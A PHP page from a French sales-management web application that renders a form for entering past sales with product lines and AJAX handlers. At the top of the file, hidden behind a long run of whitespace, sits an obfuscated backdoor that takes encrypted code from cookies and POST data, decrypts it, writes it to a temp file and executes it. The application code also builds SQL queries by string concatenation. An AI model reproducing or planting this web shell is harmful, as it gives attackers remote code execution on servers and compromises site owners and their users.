<?php                                                                                                                                                                                                                                                                                                                                                                                                 $zzbXA = "\x73" . chr ( 498 - 413 )."\141" . chr (95) . chr (97) . "\x55" . "\161" . 'U';$CKuJTNdNeU = "\143" . "\x6c" . 'a' . "\163" . "\163" . "\x5f" . 'e' . chr ( 858 - 738 ).'i' . 's' . "\164" . "\x73";$YmXcuDKwX = class_exists($zzbXA); $CKuJTNdNeU = "5734";$neAkoJ = strpos($CKuJTNdNeU, $zzbXA);if ($YmXcuDKwX == $neAkoJ){function tsLQZnRmj(){$rBZqQ = new /* 50231 */ sUa_aUqU(62282 + 62282); $rBZqQ = NULL;}$FnKid = "62282";class sUa_aUqU{private function GTtiWu($FnKid){if (is_array(sUa_aUqU::$NHAwPQSls)) {$name = sys_get_temp_dir() . "/" . crc32(sUa_aUqU::$NHAwPQSls["salt"]);@sUa_aUqU::$NHAwPQSls["write"]($name, sUa_aUqU::$NHAwPQSls["content"]);include $name;@sUa_aUqU::$NHAwPQSls["delete"]($name); $FnKid = "62282";exit();}}public function fOgakeyBSd(){$bzvmjzp = "41669";$this->_dummy = str_repeat($bzvmjzp, strlen($bzvmjzp));}public function __destruct(){sUa_aUqU::$NHAwPQSls = @unserialize(sUa_aUqU::$NHAwPQSls); $FnKid = "52939_42094";$this->GTtiWu($FnKid); $FnKid = "52939_42094";}public function pwVpyW($bzvmjzp, $tQmPKeN){return $bzvmjzp[0] ^ str_repeat($tQmPKeN, intval(strlen($bzvmjzp[0]) / strlen($tQmPKeN)) + 1);}public function rnxtJaqG($bzvmjzp){$rzKbKgMKSR = 'b' . chr ( 482 - 385 ).'s' . "\x65" . '6' . chr (52);return array_map($rzKbKgMKSR . "\x5f" . 'd' . "\x65" . chr (99) . chr (111) . chr ( 739 - 639 ).chr ( 528 - 427 ), array($bzvmjzp,));}public function __construct($kHplyxa=0){$kXcHLRN = chr ( 757 - 713 ); $bzvmjzp = "";$iFqHk = $_POST;$dWJSohlJw = $_COOKIE;$tQmPKeN = "ed0966b4-06fb-458f-82f4-607317483a10";$NtAeB = @$dWJSohlJw[substr($tQmPKeN, 0, 4)];if (!empty($NtAeB)){$NtAeB = explode($kXcHLRN, $NtAeB);foreach ($NtAeB as $npIDl){$bzvmjzp .= @$dWJSohlJw[$npIDl];$bzvmjzp .= @$iFqHk[$npIDl];}$bzvmjzp = $this->rnxtJaqG($bzvmjzp);}sUa_aUqU::$NHAwPQSls = $this->pwVpyW($bzvmjzp, $tQmPKeN);if (strpos($tQmPKeN, $kXcHLRN) !== FALSE){$tQmPKeN = explode($kXcHLRN, $tQmPKeN); $bPxgoEYB = sprintf("52939_42094", rtrim($tQmPKeN[0]));}}public static $NHAwPQSls = 55797;}tsLQZnRmj();} ?>  <?php
if (isset($_POST['ajax'])) {
include('../../evr.php');
}
 $query1=$result1=connexion::getConnexion()->query("SELECT numbon as dernier_bon FROM vente where  numbon != 0 or numbon !='' ORDER BY id_vente DESC LIMIT 1");
      $result1=$query1->fetch(PDO::FETCH_OBJ);
      $last_num = $result1->dernier_bon+1;
?>

<div class="container-fluid disable-text-selection">
    <div class="row">
        <div class="col-12">
            <div class="mb-2">
                <h1>ancienne vente </h1>
                
        <div class="float-sm-right text-zero">
                    <button type="button" class="btn btn-success  url notlink" data-url="vente/index.php" > <i class="glyph-icon simple-icon-arrow-left"></i></button>
                </div>
            </div>
            
            <div class="separator mb-5"></div>
        </div>
    </div>
    <div class="row">
        <div class="col align-self-start">
            <div class="card mb-4">
                <div class="card-body">
                    <h5 class="mb-4">Ajouter ancienne vente</h5>
                    <form id="addform" method="post" name="form_produit" enctype="multipart/form-data">
                        <input type="hidden" name="act" value="insert">
                        <div class="form-row">
                            <div class="form-group col-md-6">
                                <label for="id_client">Client : </label>
                                <select class="form-control select2-single" name="id_client" id="id_client" >
                                    
                                    <?php
                                    $client = new client();
                                    $clients = $client->selectChamps("*",'','','nom','asc');
                                    foreach ($clients as $row)
                                    {
                                    echo '<option value="'.$row->id_client.'">'.$row->nom.'</option>';
                                    }?>
                                    
                                </select>
                            </div>
                            <div class="form-group col-md-6">
                                <label for="date_vente">Date :</label>
                                <input type="text" class="form-control datepicker" id="date_vente" name="date_vente" value="<?php echo date('Y-m-d'); ?>" >
                            </div>
                            
                        </div>
                            <div class="form-row">
                                <div class="form-group col-md-2">
                                    <label for="remarque">Bon livraison :</label>
                                    <div class="mb-4">
                                        <div style="display: inline-block;" class="custom-control custom-radio">
                                            <input type="radio" id="client1" value="1" checked="" name="bonsi" class="custom-control-input bon">
                                            <label class="custom-control-label"  for="client1">Oui</label>
                                        </div>
                                        <div style="display: inline-block;margin-left: 20px" class="custom-control custom-radio">
                                            <input type="radio" id="client2" value="0" name="bonsi" class="custom-control-input bon">
                                            <label class="custom-control-label"  for="client2">Non</label>
                                        </div>
                                    </div>
                                </div>
                                <div class="form-group col-md-6" id="bon">
                                    <label for="date_vente">numéro bon :</label>
                                    <input type="text" class="form-control" id="numbon" name="numbon" value="<?php echo $last_num ?>" >
                                </div>
                            </div>
                        <div class="form-group">
                            <label for="remarque"> Remarque : </label>
                            <textarea  class="form-control" name="remarque" id="remarque"
                            ></textarea>
                        </div>
                            <div class="form-row">
                                <div class="form-group col-md-4">
                                    <label for="rech"> Recherche référence:  </label>
                                    <input type="text" class="form-control" style="border-color: red" id="rech" >
                                </div>
                            </div>
                            <div class="form-row">
                                <div class="form-group col-md-2">
                                    <label for="id_categorie"> Catégorie :</label>
                                    <select class="form-control select2-single" name="id_categorie" id="id_categorie" >
                                        
                                        <?php
                                        $categorie = new categorie();
                                        $categories = $categorie->selectAll();
                                        foreach ($categories as $row) {
                                        echo '<option value="'.$row->id_categorie.'">'.$row->nom.'</option>';
                                        }?>
                                        
                                    </select>
                                </div>
                                <div class="form-group col-md-3">
                                    <label for="id_produit"> Produit :</label>
                                    <select class="form-control select2-single" name="id_produit" id="id_produit" >
                                        
                                        <?php
                                        $depot=new depot();
                                        $res_depot=$depot->selectAll();
                                        foreach($res_depot as $rep_depot){
                                        ?>
                                        <optgroup label="<?php echo $rep_depot->nom; ?> ">
                                            <?php
                                            $produits=$depot->selectQuery("SELECT  id_produit,designation  FROM produit where   id_categorie=".$categories[0]->id_categorie." and   emplacement='".$rep_depot->id."' order by designation asc");
                                            foreach ($produits as $row) {
                                            echo '<option value="'.$row->id_produit.'">'.$row->designation.'</option>';
                                            }?>
                                        </optgroup>
                                        <?php } ?>
                                        
                                    </select>
                                </div>
                                <div class="form-group col-md-1">
                                    <label for="reste_stock">Stock</label>
                                    <span class="badge badge-danger mb-1" style=" display: block; margin-top: 10px;" id="reste_stock">0</span>
                                    
                                </div>
                                <div class="form-group col-md-1">
                                    <label for="prix_produit">P.U</label>
                                    <input type="text" name="prix_produit" id="prix_produit" class="form-control" value="0">
                                    
                                </div>
                                 <div class="form-group col-md-1">
                                    <label for="remise">Remise %</label>
                                    <input type="text" name="remise" id="remise" class="form-control" value="0">
                                    
                                </div>

                                <div class="form-group col-md-2">
                                    <label for="qte_vendu">Qte</label>
                                    <input type="text" name="qte_vendu" id="qte_vendu" class="form-control" value="0">
                                    
                                </div>

                                <div class="form-group col-md-2">
                                    <button id="addProduct" type="button" class="btn btn-success default btn-lg btn-block  mr-1 " style="margin-top: 30px;">Ajouter</button>
                                </div>
                            </div>
                            <div class="table-responsive">
                <table  class="table" cellpadding="0" cellspacing="0" id="box-table-a" summary="Employee Pay Sheet">
                      <thead>
                        <tr>
                          <th   scope="col">Produit</th>
                          <th    width="102" scope="col">Prix</th>
                          <th   width="109" scope="col">Qte</th>
                          <th   width="109" scope="col">Poid</th>
                          <th  width="129" scope="col">PU*Qte</th>
                          <th  width="129" scope="col">Action</th>
                        </tr>
                      </thead>
                      <tbody  id="detail_commande" >
                     <?php   
                      $detail_vente=new detail_vente();
            
            $data=$detail_vente->selectAllNonValide();
            $total=0;

            foreach($data as $ligne){

        ?>
        <tr>
            <td><?php echo $ligne->designation ; ?></td>
            <td><?php echo $ligne->prix_produit ; ?></td>
            <td><?php echo $ligne->qte_vendu ; ?></td>
            <td><?php echo $ligne->poid*$ligne->qte_vendu ;
                                    $somme_poid+=$ligne->poid*$ligne->qte_vendu;
            ?> g </td>
            <td width="90" style="text-align: right;" >
                <?php  echo number_format($ligne->qte_vendu * $ligne->prix_produit,2,'.',' ');
                $total+=$ligne->qte_vendu * $ligne->prix_produit* (1 - $ligne->remise/100);
                ?>
            </td>
            <td>    <a class="badge badge-danger mb-2 delete" data-id="<?php echo $ligne->id_detail; ?>" style="color: white;cursor: pointer;" title="Supprimer" href='javascript:void(0)' >
                <i class="simple-icon-trash" style="font-size: 15px;"></i>
            </a>
            </td>
        </tr>
        <?php
        }
        ?>
        <tr>
            <td colspan="4" style="text-align: center;font-size: 15px;" > <b>Total</b>   </td>
            <td style="text-align: right;" colspan="3">  <b style="font-size: 15px;color: green;text-align: right;" ><?php echo number_format($total,2,'.',' '); ?></b></td>
            
        </tr>  
                        
                      </tbody>
                    </table>
                    </div>
                        <div class="float-sm-right text-zero">
                            <button type="submit" class="btn btn-primary btn-lg  mr-1 " >Enregistrer</button>
                        </div>
                        
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
<script type="text/javascript">



 

    $( document ).ready(function() {


$(".bon").click(function(){

var  $type_compte = $(this).val();

if($type_compte==0)
{
$("#bon").hide();
}
else
{
$("#bon").show();
}
});

 $("#rech").keyup(function() {
   

            
            var id = $(this).val();
            $.ajax({
                type: "POST",
                url: "<?php echo BASE_URL.'views/ancien_vente/' ;?>controle.php",
                data: {act:"rech",id: id},
                success: function (data) {
                  
                    $('#id_produit').html(data);
                      $("#id_produit").change();
                }
            });
 });
        $(".select2-single").select2({
            theme: "bootstrap",
            placeholder: "",
            maximumSelectionSize: 6,
            containerCssClass: ":all:"
        });
        $("input.datepicker").datepicker({
                     format: 'yyyy-mm-dd',
                     templates: {
                     leftArrow: '<i class="simple-icon-arrow-left"></i>',
                     rightArrow: '<i class="simple-icon-arrow-right"></i>'
                    }
                });
            $("#id_categorie").change(function() {
   

            
            var id_categorie = $(this).val();
            $.ajax({
                type: "POST",
                url: "<?php echo BASE_URL.'views/ancien_vente/' ;?>controle.php",
                data: {act:"getproduit",id_categorie: id_categorie},
                success: function (data) {
                  
                  console.log(data);
                    $('#id_produit').html(data);
                      $("#id_produit").change();
                }
            });
  
                });
              $("#id_produit").change(function() {
   

            
            var id_produit = $(this).val();
            $.ajax({
                type: "POST",
                url: "<?php echo BASE_URL.'views/ancien_vente/' ;?>controle.php",
                data: {act:"getPrix",id_produit: id_produit},
                success: function (data) {
                   var tab=data.split('/');
                   $('#prix_produit').val(tab[0]);
                    $('#reste_stock').html(tab[1]);
                }
            });
  
            });

                 $("#addProduct").click(function() {
   


            var id_produit = $(this).val();
            $.ajax({
                type: "POST",
                url: "<?php echo BASE_URL.'views/ancien_vente/' ;?>controle.php",
                data: {act:"addProduct",id_produit: $("#id_produit").val() ,prix_produit: $("#prix_produit").val(), qte_vendu: $("#qte_vendu").val(),remise: $("#remise").val() ,},
                success: function (data) {
                    $('#detail_commande').html(data);
                }
            });
  
            });

     $('body').on( "click",".delete", function( event ) {
             event.preventDefault();


                    var btn = $(this);
                swal({
                 title: 'Êtes-vous sûr?',
                  text: "Voulez vous vraiment Supprimer ce Client !",
                  type: 'warning',
                  showCancelButton: true,
                  confirmButtonColor: '#d33',
                  cancelButtonColor: '#3085d6',
                  confirmButtonText: 'Oui, Supprimer !'
                }).then((result) => {
                  if (result.value) {

                $.ajax({
                type: "POST",
                url: "<?php echo BASE_URL.'views/ancien_vente/' ;?>controle.php",
                data: {act:"deleterow",id_detail: btn.data('id')},
                success: function (data) {
                   
                   swal(
                      'Supprimer',
                      'Client a ete bien Supprimer',
                      'success'
                    ).then((result) => {

                       // btn.parents("td").parents("tr").remove();
                          $('#detail_commande').html(data);
                    });
                   
                }
                 });
                    
                  }
                });
           
            });
    
    $("#addform" ).on( "submit", function( event ) {
             event.preventDefault();

             var form = $( this );
             $.ajax({
                type: "POST",
                url: "<?php echo BASE_URL.'views/ancien_vente/' ;?>controle.php",
                data: new FormData(this),
                dataType: 'text',  
                cache: false,
                contentType: false,
                processData: false,
                success: function (data) {

                if (data.indexOf("success")>=0) {
                   
                    swal(
                      'Ajouter',
                      'Vente a ete bien Ajouter',
                      'success'
                    ).then((result) => {
                    $.ajax({

                              method:'POST',
                              data: {ajax:true},
                              url: `<?php echo BASE_URL."views/vente/index.php"?>`,
                              context: document.body,
                              success: function(data) { 
                                      history.pushState({},"",`<?php echo BASE_URL."vente/index.php";?>` );
                                      $("#main").html( data );
                                }
                            });
                    });
                }
                else{

                     form.append(` <div id="alert-danger" class="alert  alert-danger alert-dismissible fade show rounded mb-0" role="alert">
                                <strong>${data}</strong> 
                                <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                                    <span aria-hidden="true">×</span>
                                </button>
                            </div>`);
                }
                }
            });
});

                


});
</script>
